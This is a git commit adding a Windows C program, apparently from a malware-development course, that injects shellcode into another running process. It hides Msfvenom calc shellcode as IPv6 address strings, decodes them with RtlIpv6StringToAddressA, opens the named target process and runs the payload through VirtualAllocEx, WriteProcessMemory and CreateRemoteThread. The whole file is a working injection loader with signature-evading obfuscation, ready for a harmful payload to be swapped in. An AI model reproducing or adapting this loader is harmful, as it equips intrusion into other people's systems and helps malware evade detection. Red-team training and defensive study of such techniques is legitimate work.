01f954d16453ab09aede6631a5afbcf9d77f52e3
e1n <69242462+du4L5ynchE1n@users.noreply.github.com>
2023-09-12 21:36:44 +0800

    Create RemoteShellcodeInjection_IPV6Decrypt.c

---
+++ basics/Process_Injection/Shellcode/RemoteShellcodeInjection_IPV6Decrypt.c
@@ -0,0 +1,273 @@
+// @NUL0x4C | @mrd0x : MalDevAcademy
+
+#include <Windows.h>
+#include <stdio.h>
+#include <Tlhelp32.h>
+
+// Output using `HellShell.exe calc.bin ipv6`
+// Where calc.bin is Msfvenom's calc x64 shellcode
+
+char* Ipv6Array[] = {
+		"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
+		"AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
+		"8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
+		"8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
+		"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", "6F87:FFD5:BBE0:1D2A:0A41:BAA6:95BD:9DFF",
+		"D548:83C4:283C:067C:0A80:FBE0:7505:BB47", "1372:6F6A:0059:4189:DAFF:D563:616C:6300"
+};
+
+#define NumberOfElements 17
+
+
+typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
+	PCSTR                   S,
+	PCSTR* Terminator,
+	PVOID                   Addr
+	);
+
+
+BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T NmbrOfElements, OUT PBYTE* ppDAddress, OUT SIZE_T* pDSize) {
+
+	PBYTE           pBuffer = NULL,
+		TmpBuffer = NULL;
+
+	SIZE_T          sBuffSize = NULL;
+
+	PCSTR           Terminator = NULL;
+
+	NTSTATUS        STATUS = NULL;
+
+	// Getting the RtlIpv6StringToAddressA function's base address from ntdll.dll
+	fnRtlIpv6StringToAddressA  pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
+	if (pRtlIpv6StringToAddressA == NULL) {
+		printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+	// Getting the size of the shellcode (number of elements * 16)
+	sBuffSize = NmbrOfElements * 16;
+	// Allocating memory that will hold the deobfuscated shellcode
+	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
+	if (pBuffer == NULL) {
+		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+	// setting TmpBuffer to be equal to pBuffer
+	TmpBuffer = pBuffer;
+
+
+	// Loop through all the addresses saved in Ipv6Array
+	for (int i = 0; i < NmbrOfElements; i++) {
+		// Ipv6Array[i] is a single IPv6 address from the array Ipv6Array
+		if ((STATUS = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer)) != 0x0) {
+			// Failed
+			printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X\n", Ipv6Array[i], STATUS);
+			return FALSE;
+		}
+
+		// 16 bytes are written to TmpBuffer at a time
+		// Therefore Tmpbuffer will be incremented by 16 to store the upcoming 16 bytes
+		TmpBuffer = (PBYTE)(TmpBuffer + 16);
+	}
+
+	*ppDAddress = pBuffer;
+	*pDSize = sBuffSize;
+	return TRUE;
+}
+
+
+/*
+API functions used to perform process enumeration:
+
+- CreateToolhelp32Snapshot: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
+
+- Process32First: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first
+
+- Process32Next: https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
+
+- OpenProcess: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
+
+*/
+
+// Gets the process handle of a process of name szProcessName
+BOOL GetRemoteProcessHandle(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
+
+	HANDLE			hSnapShot = NULL;
+	PROCESSENTRY32	Proc = {
+					.dwSize = sizeof(PROCESSENTRY32)
+	};
+
+	// Takes a snapshot of the currently running processes 
+	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+	if (hSnapShot == INVALID_HANDLE_VALUE) {
+		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
+		goto _EndOfFunction;
+	}
+
+	// Retrieves information about the first process encountered in the snapshot.
+	if (!Process32First(hSnapShot, &Proc)) {
+		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
+		goto _EndOfFunction;
+	}
+
+	do {
+
+		WCHAR LowerName[MAX_PATH * 2];
+
+		if (Proc.szExeFile) {
+
+			DWORD	dwSize = lstrlenW(Proc.szExeFile);
+			DWORD   i = 0;
+
+			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);
+
+			// Converting each charachter in Proc.szExeFile to a lowercase character and saving it
+			// in LowerName to do the wcscmp call later
+
+			if (dwSize < MAX_PATH * 2) {
+
+				for (; i < dwSize; i++)
+					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
+
+				LowerName[i++] = '\0';
+			}
+		}
+
+		// Compare the enumerated process path with what is passed
+		if (wcscmp(LowerName, szProcessName) == 0) {
+			// Save the process ID 
+			*dwProcessId = Proc.th32ProcessID;
+			// Open a process handle and return
+			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
+			if (*hProcess == NULL)
+				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
+
+			break;
+		}
+
+		// Retrieves information about the next process recorded the snapshot.
+		// while there is still a valid output ftom Process32Next, continue looping
+	} while (Process32Next(hSnapShot, &Proc));
+
+
+
+_EndOfFunction:
+	if (hSnapShot != NULL)
+		CloseHandle(hSnapShot);
+	if (*dwProcessId == NULL || *hProcess == NULL)
+		return FALSE;
+	return TRUE;
+}
+
+
+
+
+/*
+API functions used to perform the code injection part:
+- VirtualAllocEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
+
+- WriteProcessMemory: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
+
+- VirtualProtectEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex
+
+- CreateRemoteThread: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
+*/
+
+
+BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {
+
+	PVOID	pShellcodeAddress = NULL;
+
+	SIZE_T	sNumberOfBytesWritten = NULL;
+	DWORD	dwOldProtection = NULL;
+
+	// Allocating memory in "hProcess" process of size "sSizeOfShellcode" and memory permissions set to read and write
+	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (pShellcodeAddress == NULL) {
+		printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+	printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);
+
+	// Writing the shellcode, pShellcode, to the allocated memory, pShellcodeAddress
+	printf("[#] Press <Enter> To Write Payload ... ");
+	getchar();
+	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
+		printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+	printf("[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
+
+	// Cleaning the buffer of the shellcode in the local process
+	memset(pShellcode, '\0', sSizeOfShellcode);
+
+	// Setting memory permossions at pShellcodeAddress to be executable 
+	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+		printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+
+	// Running the shellcode as a new thread's entry in the remote process
+	printf("[#] Press <Enter> To Run ... ");
+	getchar();
+	printf("[i] Executing Payload ... ");
+	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
+		printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
+		return FALSE;
+	}
+	printf("[+] DONE !\n");
+
+	return TRUE;
+}
+
+
+
+
+
+
+int wmain(int argc, wchar_t* argv[]) {
+
+	HANDLE		hProcess = NULL;
+	DWORD		dwProcessId = NULL;
+
+	PBYTE		pDeobfuscatedPayload = NULL;
+	SIZE_T      sDeobfuscatedSize = NULL;
+
+	// Checking command line arguments
+	if (argc < 2) {
+		wprintf(L"[!] Usage : \"%s\" <Process Name> \n", argv[0]);
+		return -1;
+	}
+	// Getting a handle to the process
+	wprintf(L"[i] Searching For Process Id Of \"%s\" ... ", argv[1]);
+	if (!GetRemoteProcessHandle(argv[1], &dwProcessId, &hProcess)) {
+		printf("[!] Process is Not Found \n");
+		return -1;
+	}
+	wprintf(L"[+] DONE \n");
+	printf("[i] Found Target Process Pid: %d \n", dwProcessId);
+
+
+
+	printf("[#] Press <Enter> To Decrypt ... ");
+	getchar();
+	printf("[i] Decrypting ...");
+	if (!Ipv6Deobfuscation(Ipv6Array, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
+		return -1;
+	}
+	printf("[+] DONE !\n");
+	printf("[i] Deobfuscated Payload At : 0x%p Of Size : %d \n", pDeobfuscatedPayload, sDeobfuscatedSize);
+
+
+	// Injecting the shellcode
+	if (!InjectShellcodeToRemoteProcess(hProcess, pDeobfuscatedPayload, sDeobfuscatedSize)) {
+		return -1;
+	}
+
+
+	HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
+	CloseHandle(hProcess);
+	printf("[#] Press <Enter> To Quit ... ");
+	getchar();
+	return 0;
+}
+
